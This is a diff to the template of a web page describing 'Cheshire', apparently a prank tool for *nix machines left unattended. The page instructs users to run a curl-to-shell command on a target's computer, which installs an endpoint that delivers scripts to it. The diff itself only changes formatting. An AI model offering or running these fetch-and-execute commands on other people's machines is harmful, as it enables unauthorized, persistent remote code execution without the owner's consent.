@@ -1,7 +1,7 @@
 extends layout
 
 block content
-  h1.header Cheshire
+  h1 Cheshire
   hr
   p Welcome to Cheshire, the simplest way to cause some harmless mischief for
     | your friends who run *nix machines and leave them unattended.
@@ -17,11 +17,11 @@ block content
   h2 Get Started
   p When your target leaves their computer unattended, simply pick a unique name
     | for their box and execute the following command:
-    pre: code sh <(curl -s #{host}:#{port}/install/[name])
+    pre sh<(curl -s #{host}:#{port}/install/[name])
     | and provide a password. This will set up an endpoint at 
     code #{host}:#{port}/scripts/[name]
     |  which will hold your script-lets. By default, it contains
-    pre: code touch /tmp/cheshire
+    pre touch /tmp/cheshire
     | so if your target is going to be away from their computer on the next
     | changing of the minute, you can verify that Cheshire was installed
     | successfully.
@@ -42,7 +42,7 @@ block content
     |  parameters, not query parameters.
   p When your friend demands that you fix their computer (possibly threatening
     | you, too), or the novelty has worn off, you can simply execute
-    pre: code sh <(curl -s #{host}:#{port}/uninstall/name)
+    pre sh <(curl -s #{host}:#{port}/uninstall/name)
     | Because this removes the endpoint on the server, too, you need the
     | endpoint password for this.
 
